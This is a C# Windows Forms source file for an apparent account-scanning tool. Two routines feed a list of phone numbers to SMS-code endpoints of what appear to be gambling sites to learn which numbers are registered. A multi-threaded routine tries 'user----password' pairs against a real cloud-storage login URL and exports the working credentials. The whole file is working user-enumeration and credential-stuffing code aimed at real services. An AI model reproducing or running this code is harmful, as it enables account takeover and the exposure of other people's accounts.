using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace main._2019_6
{
    public partial class 扫号 : Form
    {
        public 扫号()
        {
            InitializeComponent();
        }

        bool zanting = true;

        private void button4_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = openFileDialog1.FileName;
            }
        }

        public void run()
        {

            if (textBox1.Text == "")
            {
                MessageBox.Show("请输入手机号文本");
                label1.Text = "请输入手机号文本";
                return;
            }
            StreamReader sr = new StreamReader(textBox1.Text, Encoding.Default);
            //一次性读取完 
            string texts = sr.ReadToEnd();
            string[] text = texts.Split(new string[] { "\r\n" }, StringSplitOptions.None);
            for (int i = 0; i < text.Length; i++)
            {
                label1.Text = "正在验证"+text[i];
                // string URL = "http://ndh.nlldbj.com//Handlers/ApiSendCode.ashx?PhoneNum=" + text[i] + "&CodeType=1";  //牛大亨

                string URL = "https://nlb.iszfl.com/Handlers/ApiSendCode.ashx?PhoneNum=" + text[i] + " &CodeType=1";    //牛老板

                string html = method.GetUrl(URL,"utf-8");

                if (html.Contains("未绑定"))
                {
                    label1.Text = text[i] + "未绑定...验证下一个";
                }
                else
                {           
                    label1.Text = text[i] + "已绑定..正在添加.....";
                    ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString()); //使用Listview展示数据         
                    lv1.SubItems.Add(text[i]);   //比分
                }

                while (this.zanting == false)
                {
                    label1.Text = "已暂停....";
                   Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
                }


                if (listView1.Items.Count > 2)
                {
                    listView1.EnsureVisible(listView1.Items.Count - 1);  //滚动到指定位置
                }

                Thread.Sleep(1000);   //内容获取间隔，可变量        

            }

            label1.Text = "验证结束，请点击导出，文本名为【导出结果】";

        }

        /// <summary>
        /// 快乐联盟
        /// </summary>

        public void run1()
        {

            if (textBox1.Text == "")
            {
                MessageBox.Show("请输入手机号文本");
                label1.Text = "请输入手机号文本";
                return;
            }
            StreamReader sr = new StreamReader(textBox1.Text, Encoding.Default);
            //一次性读取完 
            string texts = sr.ReadToEnd();
            string[] text = texts.Split(new string[] { "\r\n" }, StringSplitOptions.None);
            for (int i = 0; i < text.Length; i++)
            {
                label1.Text = "正在验证" + text[i];
               
                string URL = "http://defense.t84586.top:8080/login/sendPhoneCode?phone=" + text[i];    
               
                string html = method.GetUrl(URL, "utf-8");
               
                if (html.Contains("未绑定"))
                {
                    label1.Text = text[i] + "未绑定...验证下一个";
                }
                else
                {
                    label1.Text = text[i] + "已绑定..正在添加.....";
                    ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString()); //使用Listview展示数据         
                    lv1.SubItems.Add(text[i]);   //比分
                }

                while (this.zanting == false)
                {
                    label1.Text = "已暂停....";
                    Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
                }


                if (listView1.Items.Count > 2)
                {
                    listView1.EnsureVisible(listView1.Items.Count - 1);  //滚动到指定位置
                }

                Thread.Sleep(1000);   //内容获取间隔，可变量        

            }

            label1.Text = "验证结束，请点击导出，文本名为【导出结果】";

        }

        private void button1_Click(object sender, EventArgs e)
        {

            for (int i = 0; i < Convert.ToInt32(textBox2.Text); i++)
            {
                Thread thread = new Thread(new ThreadStart(run2));
                thread.Start();
                Control.CheckForIllegalCrossThreadCalls = false;
            }
           
           
        }


        int a = 0;
        int b = 0;
        ArrayList finishes = new ArrayList();
        public void run2()
        {
            if (textBox1.Text == "")
            {
                MessageBox.Show("请输入手机号文本");
                label1.Text = "请输入手机号文本";
                return;
            }
            StreamReader sr = new StreamReader(textBox1.Text, Encoding.Default);
            //一次性读取完 
            string texts = sr.ReadToEnd();
            string[] text = texts.Split(new string[] { "\r\n" }, StringSplitOptions.None);
            for (int i = 0; i < text.Length-1; i++)
            {
                if (!finishes.Contains(text[i]))
                {
                    finishes.Add(text[i]);
                    string[] zhanghao = text[i].Split(new string[] { "----" }, StringSplitOptions.None);
                    if (zhanghao.Length > 1)
                    {
                        string html = method.GetUrl("https://teracloud.jp/en/index.php?cmd=user&password=" + zhanghao[1] + "&pcmd=login&userid=" + zhanghao[0], "utf-8");
                        if (html.Contains("firstname"))
                        {
                            a = a + 1;
                            ListViewItem lv2= listView2.Items.Add((listView2.Items.Count).ToString()); //使用Listview展示数据         
                            lv2.SubItems.Add(zhanghao[0]);
                            lv2.SubItems.Add(zhanghao[1]);
                            lv2.SubItems.Add("正确");
                           
                        }
                        else
                        {
                            b = b +1;
                            ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString()); //使用Listview展示数据         
                            lv1.SubItems.Add(zhanghao[0]);
                            lv1.SubItems.Add(zhanghao[1]);
                            lv1.SubItems.Add("错误");
                          

                        }
                        label1.Text = "当前正确" + a + "个"+ "当前错误" + b + "个";
                        while (this.zanting == false)
                        {
                            Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
                        }
                    }
                }
            }

          


        }

        private void button2_Click(object sender, EventArgs e)
        {
            zanting = false;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            zanting = true;
        }

        private void button6_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            method.expotTxt(listView2);
        }

        private void 扫号_Load(object sender, EventArgs e)
        {
           
        }
    }
}
